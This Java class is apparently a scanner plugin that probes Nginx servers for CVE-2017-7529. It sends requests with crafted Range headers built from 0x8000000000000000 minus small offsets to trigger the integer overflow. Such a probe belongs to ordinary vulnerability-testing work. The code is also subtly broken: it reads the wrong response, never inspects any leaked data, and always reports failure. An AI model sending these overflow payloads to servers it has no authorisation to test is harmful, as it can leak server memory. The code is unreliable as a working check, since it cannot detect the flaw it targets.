package cn.com.sgcc.marki_with_maven.modules;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.codec.digest.Md5Crypt;
import org.apache.http.Header;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;

import cn.com.sgcc.marki_with_maven.misc.Tools;

public class CVE_2017_7529NginxIntegerOverflow implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "CVE_2017_7529NginxIntegerOverflow");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if ( serviceVersion.toLowerCase().contains("nginx"))
		{
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s/", serviceType.contains("https") ? "https":"http", ip, port );
			HttpGet httpGet = new HttpGet(url);
			customClient = new Tools().getCustomClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			Header firstHeader = resp.getFirstHeader("Content-Length");
			int contentLength = Integer.valueOf(firstHeader.getValue());
			httpGet.releaseConnection();
			
			
			for (int i : new int[]{6, 12, 25, 50, 100, 150, 200, 250,  300, 350,  400, 500, 600, 700, 800, 900, 1000})
			{
				HttpGet httpGetLocal = new HttpGet(url);
				httpGetLocal.setHeader("Range", String.format("bytes=-%s,-%s", i + "", (0x8000000000000000L -i) + "" ));
				CloseableHttpResponse respLocal = customClient.execute(httpGetLocal);
				String string = EntityUtils.toString(resp.getEntity());
				
			}
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return success;
	}

}
